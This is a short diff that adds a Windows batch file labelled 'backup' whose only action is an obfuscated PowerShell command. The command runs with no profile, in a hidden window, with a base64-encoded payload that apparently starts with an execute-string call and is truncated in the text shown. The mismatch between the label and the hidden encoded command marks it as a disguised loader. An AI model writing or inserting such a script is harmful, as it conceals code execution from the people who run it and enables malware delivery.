@@ -1,0 +1,3 @@
+@echo off
+REM backup
+powershell -nop -w hidden -enc SQBFAFA...
